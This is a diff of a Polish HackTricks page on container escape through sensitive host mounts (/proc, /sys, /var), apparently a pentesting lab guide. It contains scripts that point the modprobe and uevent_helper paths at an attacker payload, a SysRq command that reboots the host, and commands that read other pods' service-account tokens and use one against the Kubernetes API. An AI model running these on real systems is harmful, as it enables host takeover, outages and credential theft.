@@ -1,23 +1,27 @@
-# Wrażliwe mounty hosta
+# Wrażliwe montowania hosta
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Overview
+## Przegląd
 
-Mounty hosta są jednymi z najważniejszych praktycznych powierzchni container-escape, ponieważ często niwelują starannie odizolowany widok procesów, przywracając bezpośredni dostęp do zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounty `/proc`, `/sys`, `/var`, socketów runtime, stanu zarządzanego przez kubelet lub ścieżek związanych z urządzeniami mogą ujawniać mechanizmy kontroli kernela, dane uwierzytelniające, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.
+Montowania hosta to jedna z najważniejszych praktycznych powierzchni ucieczki z kontenera, ponieważ często niwelują starannie odizolowany widok procesu i ponownie zapewniają mu bezpośredni dostęp do zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounty `/proc`, `/sys`, `/var`, gniazd runtime, stanu zarządzanego przez kubelet lub ścieżek związanych z urządzeniami mogą ujawniać mechanizmy kontroli jądra, poświadczenia, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.
 
-Ta strona istnieje oddzielnie od poszczególnych stron dotyczących ochrony, ponieważ model nadużycia obejmuje wiele obszarów. Writable host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu zakresu ochrony AppArmor lub SELinux, a częściowo z powodu tego, jaka dokładnie ścieżka hosta została ujawniona. Traktowanie tego jako osobnego tematu znacznie ułatwia analizę attack surface.
+Ta strona została wydzielona z poszczególnych stron dotyczących zabezpieczeń, ponieważ model nadużyć obejmuje wiele obszarów. Zapis do montowania hosta jest niebezpieczny częściowo z powodu przestrzeni nazw montowań, częściowo z powodu przestrzeni nazw użytkowników, częściowo z powodu zakresu ochrony AppArmor lub SELinux, a częściowo z powodu konkretnej ujawnionej ścieżki hosta. Omówienie tego zagadnienia jako osobnego tematu znacznie ułatwia analizę powierzchni ataku.
+
+Porównaj też katalog hosta z prawem do zapisu z odpowiadającą mu ścieżką wewnątrz każdego kontenera. Jeśli jest zamontowany w katalogu zawierającym wykonywalne skrypty startowe, użytkownik hosta o niższych uprawnieniach może umieścić tam kod, który punkt wejścia kontenera o wyższych uprawnieniach załaduje przy następnym restarcie. Potwierdź dokładne źródło i miejsce docelowe bind mounta, uprawnienia do zapisu i przeszukiwania katalogu, pętlę punktu wejścia i wymóg dotyczący pliku wykonywalnego, UID runtime oraz rzeczywisty mechanizm wyzwalający restart. UID 0 kontenera nie oznacza automatycznie UID 0 hosta; o wpływie na hosta decydują mapowanie przestrzeni nazw użytkowników i zasady montowania. Pasywny przegląd powinien wskazywać ścieżki i uprawnienia, nie zapisując skryptu ani nie restartując obciążenia.
+
+Kontener Linux może działać wewnątrz maszyny wirtualnej zarządzającej, która udostępnia część systemu plików osobnego hosta Windows. [Foldery współdzielone VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) to jeden ze sposobów udostępniania plików hosta systemowi gościa, ale root w tej maszynie wirtualnej nadal jest inną tożsamością niż administrator Windows. Jeśli udział udostępnia odczytywalny prywatny klucz SSH użytkownika, potraktuj go jako trop dotyczący poświadczeń: zweryfikuj dokładne montowanie oparte na hoście, właściciela klucza i dostęp do niego, pasujące konto oraz **efektywne** zasady dotyczące autoryzowanych kluczy serwera SSH w Windows, zanim stwierdzisz, że umożliwia on logowanie do hosta. Współczesny [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) często używa osobnego pliku `administrators_authorized_keys` dla kont administratorów. Nie umieszczaj zawartości kluczy prywatnych w standardowych wynikach enumeracji; do pasywnej analizy wystarczą metadane montowania i ścieżki klucza.
 
 ## Ujawnienie `/proc`
 
-procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy kontroli kernela o dużym wpływie. Bind mount, taki jak `-v /proc:/host/proc`, lub widok kontenera, który ujawnia nieoczekiwanie zapisywalne wpisy proc, może w konsekwencji prowadzić do ujawnienia informacji, denial of service lub bezpośredniego code execution na hoście.
+procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy jądra o dużym wpływie. Dlatego bind mount, taki jak `-v /proc:/host/proc`, lub widok kontenera ujawniający nieoczekiwane zapisywalne wpisy proc może prowadzić do ujawnienia informacji, odmowy usługi lub bezpośredniego wykonania kodu na hoście.
 
-Ścieżki procfs o wysokiej wartości obejmują:
+Ważne ścieżki procfs obejmują:
 
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
 - `/proc/sys/vm/panic_on_oom`
-- `/proc/sys/fs/binfmt_misc/` (szczególnie `register` i `status`)
+- `/proc/sys/fs/binfmt_misc/` (zwłaszcza `register` i `status`)
 - `/proc/config.gz`
 - `/proc/sysrq-trigger`
 - `/proc/kmsg`
@@ -27,66 +31,71 @@ procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy kontrol
 - `/proc/sched_debug`
 - `/proc/[pid]/mountinfo`
 
-### Abuse
+### Nadużycie
 
-Zacznij od sprawdzenia, które wpisy procfs o wysokiej wartości są widoczne lub zapisywalne:
+Zacznij od sprawdzenia, które ważne wpisy procfs są widoczne lub zapisywalne:
+
 ```bash
 for p in \
-/proc/sys/kernel/core_pattern \
-/proc/sys/kernel/modprobe \
-/proc/sys/fs/binfmt_misc/status \
-/proc/sys/fs/binfmt_misc/register \
-/proc/sysrq-trigger \
-/proc/kmsg \
-/proc/kallsyms \
-/proc/kcore \
-/proc/sched_debug \
-/proc/1/mountinfo \
-/proc/config.gz; do
-[ -e "$p" ] && ls -l "$p"
+  /proc/sys/kernel/core_pattern \
+  /proc/sys/kernel/modprobe \
+  /proc/sys/fs/binfmt_misc/status \
+  /proc/sys/fs/binfmt_misc/register \
+  /proc/sysrq-trigger \
+  /proc/kmsg \
+  /proc/kallsyms \
+  /proc/kcore \
+  /proc/sched_debug \
+  /proc/1/mountinfo \
+  /proc/config.gz; do
+  [ -e "$p" ] && ls -l "$p"
 done
 ```
-Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się ścieżkami wykonywania kodu na host, jeśli są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` są potężnymi źródłami rozpoznania podczas kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst procesów, cgroups i systemu plików, co może pomóc w odtworzeniu układu hosta z wnętrza containera.
 
-Praktyczna wartość każdej ścieżki jest inna, a traktowanie ich tak, jakby wszystkie miały ten sam wpływ, utrudnia triage:
+Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się ścieżkami do wykonania kodu na hoście, jeśli są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` to cenne źródła informacji rozpoznawczych przy kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst procesów, cgroup i systemu plików, co może pomóc odtworzyć układ hosta z poziomu kontenera.
+
+Praktyczne znaczenie każdej ścieżki jest inne, a traktowanie ich tak, jakby miały jednakowy wpływ, utrudnia triage:
 
 - `/proc/sys/kernel/core_pattern`
-Jeśli jest zapisywalna, jest to jedna ze ścieżek procfs o największym wpływie, ponieważ kernel wykona handler potoku po awarii. Container, który może wskazać `core_pattern` na payload zapisany w swoim overlayu lub w zamontowanej ścieżce hosta, często może uzyskać wykonanie kodu na host. Zobacz także [read-only-paths.md](protections/read-only-paths.md), gdzie znajduje się dedykowany przykład.
+  Jeśli ta ścieżka jest zapisywalna, należy do tych o największym potencjalnym wpływie w procfs, ponieważ po awarii kernel uruchomi handler potoku. Kontener, który może ustawić `core_pattern` na payload zapisany w swojej warstwie overlay lub w zamontowanej ścieżce hosta, często może uzyskać wykonanie kodu na hoście. Zobacz też [read-only-paths.md](protections/read-only-paths.md), gdzie znajduje się dedykowany przykład.
 - `/proc/sys/kernel/modprobe`
-Ta ścieżka kontroluje helper userspace używany przez kernel, gdy musi uruchomić logikę ładowania modułów. Jeśli jest zapisywalna z containera i interpretowana w kontekście hosta, może stać się kolejnym prymitywem wykonywania kodu na host. Jest szczególnie interesująca w połączeniu ze sposobem wyzwolenia ścieżki helpera.
+  Ta ścieżka wskazuje helpera userspace, którego używa kernel, gdy musi uruchomić logikę ładowania modułów. Jeśli jest zapisywalna z kontenera i interpretowana w kontekście hosta, może stać się kolejnym prymitywem do wykonania kodu na hoście. Jest szczególnie interesująca w połączeniu z możliwością wywołania tej ścieżki helpera.
 - `/proc/sys/vm/panic_on_oom`
-Zwykle nie jest to czysty prymityw escape, ale może przekształcić presję pamięci w odmowę usługi obejmującą całego hosta, zamieniając sytuacje OOM w zachowanie prowadzące do kernel panic.
+  Zwykle nie jest to prosty prymityw ucieczki z kontenera, ale może przekształcić presję na pamięć w odmowę usługi obejmującą cały host, powodując panikę kernela w sytuacji OOM.
 - `/proc/sys/fs/binfmt_misc`
-Jeśli interfejs rejestracji jest zapisywalny, attacker może zarejestrować handler dla wybranej wartości magicznej i uzyskać wykonanie w kontekście hosta po uruchomieniu pasującego pliku.
+  Jeśli interfejs rejestracji jest zapisywalny, atakujący może zarejestrować handler dla wybranej wartości magicznej i uzyskać wykonanie w kontekście hosta, gdy zostanie uruchomiony pasujący plik.
 - `/proc/config.gz`
-Przydatne podczas triage kernel exploitów. Pomaga ustalić, które subsystemy, mitigations i opcjonalne funkcje kernela są włączone, bez potrzeby korzystania z metadanych pakietów hosta.
+  Przydatny do triage exploitów kernela. Pomaga ustalić, które podsystemy, mechanizmy łagodzące i opcjonalne funkcje kernela są włączone, bez konieczności dostępu do metadanych pakietów hosta.
 - `/proc/sysrq-trigger`
-Głównie ścieżka odmowy usługi, ale bardzo poważna. Może natychmiast zrestartować hosta, wywołać panic lub w inny sposób go zakłócić.
+  To przede wszystkim ścieżka umożliwiająca odmowę usługi, ale bardzo poważną. Może natychmiast zrestartować hosta, wywołać panikę kernela lub w inny sposób zakłócić jego działanie.
 - `/proc/kmsg`
-Ujawnia komunikaty kernelowego ring buffera. Przydatne do fingerprintingu hosta, analizy awarii i w niektórych środowiskach do leakowania informacji pomocnych przy kernel exploitation.
+  Ujawnia komunikaty z bufora pierścieniowego kernela. Przydatny do fingerprintingu hosta, analizy awarii, a w niektórych środowiskach także do wycieku informacji pomocnych przy kernel exploitation.
 - `/proc/kallsyms`
-Cenne, gdy jest dostępne do odczytu, ponieważ ujawnia informacje o eksportowanych symbolach kernela i może pomóc obejść założenia dotyczące randomizacji adresów podczas tworzenia kernel exploitów.
+  Jest cenny, gdy można go odczytać, ponieważ ujawnia informacje o eksportowanych symbolach kernela i może pomóc obejść założenia dotyczące randomizacji adresów podczas tworzenia exploita kernela.
 - `/proc/[pid]/mem`
-Jest to bezpośredni interfejs do pamięci procesu. Jeśli proces docelowy jest osiągalny przy spełnieniu wymaganych warunków w stylu ptrace, może umożliwiać odczyt lub modyfikację pamięci innego procesu. Rzeczywisty wpływ zależy w dużej mierze od poświadczeń, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
+  To bezpośredni interfejs do pamięci procesu. Jeśli proces docelowy jest osiągalny i spełnione są wymagane warunki podobne do ptrace, może umożliwić odczyt lub modyfikację pamięci innego procesu. Realny wpływ zależy w dużej mierze od poświadczeń, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
 - `/proc/kcore`
-Udostępnia widok pamięci systemu w stylu obrazu core. Plik jest ogromny i niewygodny w użyciu, ale jeśli można go sensownie odczytać, oznacza to poważnie odsłoniętą powierzchnię pamięci hosta.
+  Udostępnia widok pamięci systemu w formie zbliżonej do obrazu core dumpa. Plik jest ogromny i niewygodny w użyciu, ale jeśli da się go odczytać w praktycznym zakresie, oznacza to poważne odsłonięcie pamięci hosta.
 - `/dev/kmem` i `/dev/mem`
-Są to historycznie bardzo istotne interfejsy **device** do surowej pamięci, a nie pliki procfs. W wielu nowoczesnych systemach nie występują lub są silnie ograniczone, ale container, który może otworzyć kopię zamontowaną z hosta, powinien traktować takie ujawnienie jako krytyczne. Należy analizować je razem z innymi wrażliwymi mountami `/dev`, zamiast szukać nieistniejących ścieżek `/proc/kmem` lub `/proc/mem`.
+  Historycznie były to interfejsy urządzeń do surowej pamięci o dużym potencjalnym wpływie, a nie pliki procfs. W wielu współczesnych systemach są nieobecne lub mocno ograniczone, ale kontener, który może otworzyć zamontowaną kopię z hosta, powinien traktować to narażenie jako krytyczne. Sprawdzaj je razem z innymi wrażliwymi montowaniami `/dev`, zamiast szukać nieistniejących ścieżek `/proc/kmem` lub `/proc/mem`.
 - `/proc/sched_debug`
-Leakuje informacje o harmonogramowaniu i zadaniach, które mogą ujawniać tożsamości procesów hosta, nawet gdy inne widoki procesów wyglądają czyściej niż oczekiwano.
+  Ujawnia informacje o planowaniu i zadaniach, które mogą odsłonić tożsamość procesów hosta, nawet gdy inne widoki procesów wyglądają na bardziej ograniczone, niż można by się spodziewać.
 - `/proc/[pid]/mountinfo`
-Niezwykle przydatne do odtworzenia, gdzie container rzeczywiście znajduje się na hoście, które ścieżki są oparte na overlayu oraz czy zapisywalny mount odpowiada zawartości hosta, czy tylko warstwie containera.
+  Jest niezwykle przydatny do odtworzenia rzeczywistej lokalizacji kontenera na hoście, ustalenia, które ścieżki są oparte na overlay, oraz sprawdzenia, czy zapisywalne montowanie wskazuje na zawartość hosta, czy tylko na warstwę kontenera.
 
-Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlayu są dostępne do odczytu, użyj ich do odzyskania ścieżki hosta dla systemu plików containera:
+Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlay są czytelne, wykorzystaj je do ustalenia ścieżki systemu plików kontenera na hoście:
+
 ```bash
 cat /proc/self/mountinfo | head -n 50
 mount | grep overlay
 ```
-Te polecenia są przydatne, ponieważ wiele trików host-execution wymaga przekształcenia ścieżki wewnątrz kontenera w odpowiadającą jej ścieżkę z perspektywy hosta.
 
-### Przykład: przygotowanie ścieżki pomocnika `modprobe`
+Te polecenia są przydatne, ponieważ wiele sztuczek umożliwiających wykonanie kodu na hoście wymaga przekształcenia ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z perspektywy hosta.
 
-Jeśli `/proc/sys/kernel/modprobe` jest zapisywalny z poziomu kontenera, a ścieżka pomocnika jest interpretowana w kontekście hosta, można przekierować ją do payloadu kontrolowanego przez atakującego. Katalog upper overlay musi zostać rozwiązany z poziomu hosta, a dane potwierdzające wykonanie muszą zostać zapisane z powrotem w tej samej widocznej dla hosta warstwie kontenera, jeśli kontener nie montuje również hostowego `/tmp`:
+### Przykład: Przygotowanie ścieżki pomocnika `modprobe`
+
+Jeśli z kontenera można zapisywać do `/proc/sys/kernel/modprobe`, a ścieżka pomocnika jest interpretowana w kontekście hosta, można przekierować ją na payload kontrolowany przez atakującego. Katalog upper w overlay musi wskazywać właściwe miejsce z perspektywy hosta, a potwierdzenie wykonania musi zostać zapisane z powrotem w tej samej warstwie kontenera widocznej z hosta, jeśli kontener nie montuje również hostowego `/tmp`:
+
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -103,31 +112,36 @@ cat /proc/sys/kernel/modprobe
 cat /tmp/modprobe.out
 printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
 ```
-Dokładny wyzwalacz zależy od celu i zachowania kernela i celowo nie jest zgadywany. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Najważniejsze jest to, że zapisywalna ścieżka pomocnicza może przekierować przyszłe wywołanie pomocnika kernela do treści ścieżki hosta kontrolowanej przez attackera. Brak `upperdir` nakładki, ścieżka, której host nie może rozwiązać, montowanie sysctl tylko do odczytu lub kernel, który nigdy nie wywołuje wybranego pomocnika, przerywa ten łańcuch.
 
-### Pełny przykład: rozpoznanie kernela za pomocą `kallsyms`, `kmsg` i `config.gz`
+Dokładny mechanizm wyzwalający zależy od celu i zachowania jądra i celowo nie jest zgadywany. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Ważne jest to, że zapisywalna ścieżka pomocnicza może przekierować przyszłe wywołanie helpera jądra do zawartości ścieżki hosta kontrolowanej przez atakującego. Brak `upperdir` w overlay, ścieżka, której host nie może rozwiązać, montowanie sysctl tylko do odczytu albo jądro, które nigdy nie wywołuje wybranego helpera, przerywa ten łańcuch.
 
-Jeśli celem jest ocena możliwości wykorzystania, a nie natychmiastowy escape:
+### Pełny przykład: rozpoznanie jądra za pomocą `kallsyms`, `kmsg` i `config.gz`
+
+Jeśli celem jest ocena podatności na exploit, a nie natychmiastowe wydostanie się z kontenera:
+
 ```bash
 head -n 20 /proc/kallsyms 2>/dev/null
 dmesg 2>/dev/null | head -n 50
 zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
 ```
-Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy najnowsze komunikaty kernela ujawniają interesujący stan oraz które funkcje kernela lub mechanizmy mitigacji zostały skompilowane. Skutek zazwyczaj nie polega na bezpośrednim escape, ale może znacznie skrócić triage podatności kernela.
+
+Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy ostatnie komunikaty jądra ujawniają interesujący stan oraz które funkcje lub mechanizmy ochronne jądra zostały wkompilowane. Zwykle nie prowadzi to bezpośrednio do ucieczki z kontenera, ale może znacznie przyspieszyć analizę podatności jądra.
 
 ### Pełny przykład: ponowne uruchomienie hosta przez SysRq
 
 Jeśli `/proc/sysrq-trigger` jest zapisywalny i zapewnia dostęp do widoku hosta:
+
 ```bash
 echo b > /proc/sysrq-trigger
 ```
-Efektem jest natychmiastowy reboot hosta. Nie jest to subtelny przykład, ale wyraźnie pokazuje, że ekspozycja procfs może być znacznie poważniejsza niż ujawnienie informacji.
+
+Efekt to natychmiastowy reboot hosta. To nie jest subtelny przykład, ale wyraźnie pokazuje, że dostęp do procfs może mieć znacznie poważniejsze skutki niż ujawnienie informacji.
 
 ## Ekspozycja `/sys`
 
-sysfs ujawnia duże ilości informacji o stanie kernela i urządzeń. Niektóre ścieżki sysfs są przydatne głównie do fingerprintingu, podczas gdy inne mogą wpływać na wykonywanie helperów, działanie urządzeń, konfigurację security modules lub stan firmware.
+sysfs udostępnia duże ilości informacji o stanie jądra i urządzeń. Niektóre ścieżki sysfs są przydatne głównie do fingerprintingu, a inne mogą wpływać na uruchamianie programów pomocniczych, działanie urządzeń, konfigurację modułów bezpieczeństwa lub stan firmware’u.
 
-Ścieżki sysfs o wysokiej wartości obejmują:
+Ścieżki sysfs o dużym znaczeniu:
 
 - `/sys/kernel/uevent_helper`
 - `/sys/class/thermal`
@@ -137,11 +151,12 @@ sysfs ujawnia duże ilości informacji o stanie kernela i urządzeń. Niektóre 
 - `/sys/firmware/efi/efivars`
 - `/sys/kernel/debug`
 
-Ścieżki te mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na działanie zarządzania temperaturą, a tym samym na stabilność hosta w środowiskach z niewłaściwą ekspozycją. `/sys/kernel/vmcoreinfo` może leakować informacje o zrzutach awarii i układzie kernela, pomagające w niskopoziomowym fingerprintingu hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, dlatego nieoczekiwany dostęp do niego może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia bootowania obsługiwane przez firmware, co czyni je znacznie poważniejszymi niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ celowo stanowi interfejs przeznaczony dla developerów i podlega znacznie mniejszym wymogom bezpieczeństwa niż zahartowane produkcyjne API kernela.
+Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na działanie zarządzania temperaturą, a tym samym na stabilność hosta w środowiskach z niewłaściwie skonfigurowanym dostępem. `/sys/kernel/vmcoreinfo` może leakować informacje o zrzutach awaryjnych i układzie jądra, przydatne do niskopoziomowego fingerprintingu hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany dostęp do niego może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia rozruchu przechowywane w firmware, przez co są znacznie groźniejsze niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ jest to interfejs przeznaczony dla deweloperów, wobec którego obowiązują znacznie mniejsze wymagania bezpieczeństwa niż w przypadku utwardzonych produkcyjnych API jądra.
 
-Każdy wpis sysfs z tej listy jest **zależny od kernela, konfiguracji i sprzętu**. Obecne wirtualizowane nodes często całkowicie pomijają `uevent_helper`, zmienne EFI oraz wpisy urządzeń termicznych. Nieobecną ścieżkę należy odnotować jako negatywny prerequisite, zamiast zakładać, że przykład z innego kernela ma zastosowanie.
+Każdy wpis sysfs z tej listy zależy od **jądra, konfiguracji i sprzętu**. Współczesne węzły środowisk zwirtualizowanych często w ogóle nie zawierają `uevent_helper`, zmiennych EFI ani wpisów urządzeń termicznych. Brakującą ścieżkę należy odnotować jako niespełniony warunek wstępny, zamiast zakładać, że przykład z innego jądra będzie mieć zastosowanie.
 
-Przydatne commands do przeglądu tych ścieżek to:
+Przydatne polecenia do sprawdzenia tych ścieżek:
+
 ```bash
 find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
@@ -149,17 +164,19 @@ find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
 cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
 ```
+
 Co sprawia, że te polecenia są interesujące:
 
-- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inna powierzchnia LSM jest widoczna w sposób, który powinien pozostać dostępny wyłącznie z poziomu hosta.
-- `/sys/kernel/debug` jest często najbardziej alarmującym znaleziskiem w tej grupie. Jeśli `debugfs` jest zamontowany i możliwy do odczytu lub zapisu, należy spodziewać się szerokiej powierzchni komunikującej się z kernelem, której dokładne ryzyko zależy od włączonych węzłów debugowania.
-- Ekspozycja zmiennych EFI jest mniej powszechna, ale jeśli występuje, ma duży wpływ, ponieważ dotyczy ustawień wspieranych przez firmware, a nie zwykłych plików środowiska uruchomieniowego.
-- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla prostego escape w stylu shellowym.
-- `/sys/kernel/vmcoreinfo` jest głównie źródłem informacji przydatnych do fingerprintingu hosta i analizy awarii, pomagającym zrozumieć niskopoziomowy stan kernela.
+- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inny interfejs LSM jest widoczny w sposób, który powinien być dostępny wyłącznie z poziomu hosta.
+- `/sys/kernel/debug` jest często najbardziej niepokojącym znaleziskiem w tej grupie. Jeśli `debugfs` jest zamontowany i można go odczytywać lub zapisywać, należy spodziewać się szerokiej powierzchni dostępu do jądra, której dokładne ryzyko zależy od włączonych węzłów debugowania.
+- Dostęp do zmiennych EFI jest rzadszy, ale jeśli występuje, ma poważne konsekwencje, ponieważ dotyczy ustawień przechowywanych w firmware, a nie zwykłych plików środowiska uruchomieniowego.
+- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla prostego escape’a w stylu powłoki.
+- `/sys/kernel/vmcoreinfo` jest przede wszystkim źródłem informacji do identyfikacji hosta i analizy awarii, przydatnym do zrozumienia niskopoziomowego stanu jądra.
 
 ### Pełny przykład: `uevent_helper`
 
-`/sys/kernel/uevent_helper` zależy od kernela i konfiguracji, a na wielu współczesnych systemach nie występuje. Jeśli istnieje, jest możliwy do zapisu i dostępny jest użyteczny trigger `uevent`, kernel może wykonać helper kontrolowany przez atakującego. Output demonstracyjny musi używać ścieżki widocznej zarówno z perspektywy hosta, jak i kontenera:
+`/sys/kernel/uevent_helper` zależy od jądra i jego konfiguracji; w wielu obecnych systemach tego pliku nie ma. Jeśli istnieje, można go zapisywać i dostępny jest użyteczny wyzwalacz `uevent`, jądro może uruchomić kontrolowany przez atakującego program pomocniczy. W wyniku potwierdzającym należy użyć ścieżki widocznej zarówno z perspektywy hosta, jak i kontenera:
+
 ```bash
 [ -w /sys/kernel/uevent_helper ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -174,60 +191,69 @@ echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 # This virtual-device path is a common lab trigger, but is not present everywhere.
 uevent_file=/sys/class/mem/null/uevent
 if [ ! -w "$uevent_file" ]; then
-printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
-echo "No writable, pre-approved uevent trigger was found" >&2
-exit 1
+  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
+  echo "No writable, pre-approved uevent trigger was found" >&2
+  exit 1
 fi
 echo change > "$uevent_file"
 cat /output
 printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
 ```
-Powodem, dla którego to działa, jest interpretowanie ścieżki helpera z perspektywy hosta. Po wyzwoleniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera. `/sys/class/mem/null/uevent` jest jednym konkretnym triggerem w kernelach, które go udostępniają; inne urządzenia mogą udostępniać własne pliki `uevent`, ale nie wybieraj żadnego bez zastanowienia na prawdziwym sprzęcie. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Nie zgłaszaj tej techniki jako dostępnej, jeśli brakuje pliku helpera lub kontrolowanego triggera.
 
-## Ekspozycja `/var`
+Powodem, dla którego to działa, jest interpretowanie ścieżki helpera z perspektywy hosta. Po wyzwoleniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera. `/sys/class/mem/null/uevent` to konkretny trigger dostępny w jądrach, które go udostępniają; inne urządzenia mogą udostępniać własne pliki `uevent`, ale nie wybieraj żadnego z nich w ciemno na rzeczywistym sprzęcie. Przywróć pierwotną wartość przed opuszczeniem labu. Nie zgłaszaj tej techniki jako dostępnej, jeśli nie ma pliku helpera lub kontrolowanego triggera.
 
-Mountowanie hostowego `/var` do kontenera jest często niedoceniane, ponieważ nie wygląda tak spektakularnie jak mountowanie `/`. W praktyce może wystarczyć do uzyskania dostępu do socketów runtime, katalogów snapshotów kontenerów, wolumenów podów zarządzanych przez kubelet, projektowanych tokenów service-account oraz systemów plików sąsiednich aplikacji. Na nowoczesnych węzłach `/var` często zawiera najważniejszy operacyjnie stan kontenerów.
+## `/var` Exposure
+
+Montowanie `/var` hosta w kontenerze jest często niedoceniane, bo nie wygląda tak dramatycznie jak montowanie `/`. W praktyce może wystarczyć, aby uzyskać dostęp do socketów runtime, katalogów snapshotów kontenerów, wolumenów podów zarządzanych przez kubelet, projektowanych tokenów service account oraz systemów plików sąsiadujących aplikacji. We współczesnych węzłach `/var` często zawiera najbardziej interesujący operacyjnie stan kontenerów.
 
 ### Przykład Kubernetes
 
-Pod z `hostPath: /var` może często odczytywać projektowane tokeny innych podów oraz zawartość snapshotów overlay:
+Pod z `hostPath: /var` często może odczytywać projektowane tokeny innych podów i zawartość snapshotów overlay:
+
 ```bash
 find /host-var/ -type f -iname '*.env*' 2>/dev/null
 find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
 ```
-Te polecenia są przydatne, ponieważ pokazują, czy mount udostępnia wyłącznie nieistotne dane aplikacji, czy też dane uwierzytelniające klastra o dużym wpływie. Możliwy do odczytu token service-account może natychmiast przekształcić lokalne wykonanie kodu w dostęp do Kubernetes API.
 
-Jeśli token jest obecny, sprawdź, do czego zapewnia dostęp, zamiast kończyć na jego wykryciu:
+Te polecenia są przydatne, ponieważ pozwalają ustalić, czy mount udostępnia tylko nieistotne dane aplikacji, czy też poświadczenia klastra o dużym znaczeniu. Możliwy do odczytania token service account może natychmiast zapewnić dostęp do Kubernetes API po uzyskaniu lokalnego wykonania kodu.
+
+Jeśli token jest obecny, sprawdź, do czego zapewnia dostęp, zamiast poprzestawać na jego wykryciu:
+
 ```bash
 TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
 ```
-Skutki mogą być znacznie poważniejsze niż dostęp do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zmienić zamontowane `/var` w kompromitację całego klastra.
+
+Skutki mogą być znacznie poważniejsze niż uzyskanie dostępu do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zmienić zamontowany `/var` w sposób na przejęcie całego klastra.
 
 ### Przykład Docker i containerd
 
-Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na węzłach Kubernetes korzystających z containerd mogą znajdować się w `/var/lib/containerd` lub w ścieżkach zależnych od snapshottera:
+Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na węzłach Kubernetes korzystających z containerd mogą znajdować się w `/var/lib/containerd` lub ścieżkach specyficznych dla snapshottera:
+
 ```bash
 docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
 find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
 find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
 ```
